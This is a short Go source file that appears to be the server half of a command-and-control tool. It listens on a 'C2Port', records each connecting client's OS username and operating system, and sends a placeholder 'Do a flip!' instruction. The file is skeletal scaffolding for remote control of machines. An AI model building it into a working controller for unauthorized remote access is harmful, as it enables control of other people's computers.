package cmd

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"

	"github.com/spf13/viper"
)

type Client struct {
	OS_username     string
	OperatingSystem string
	Conn            net.Conn
}

type Instructions struct {
	Message string
}

var (
	C2Port     string = "1302"
	clientList []*Client
)

func (I Instructions) Send(c net.Conn) {
	message := "Do a flip!\n"
	c.Write([]byte(message))
}

func Server() {
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	client, err := getOS(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
	}
	client.Conn = conn
	fmt.Println("Got info from new user:", client.OS_username, client.OperatingSystem)
	clientList = append(clientList, client)
}

func sendInstructions(conn net.Conn) {
	i := Instructions{}
	i.Send(conn)
}

func getOS(conn net.Conn) (*Client, error) {
	dec := gob.NewDecoder(conn)
	c := new(Client)
	err := dec.Decode(&c)
	if err != nil {
		bad := Client{}
		return &bad, err
	}
	clientList = append(clientList, c)
	return c, nil
}
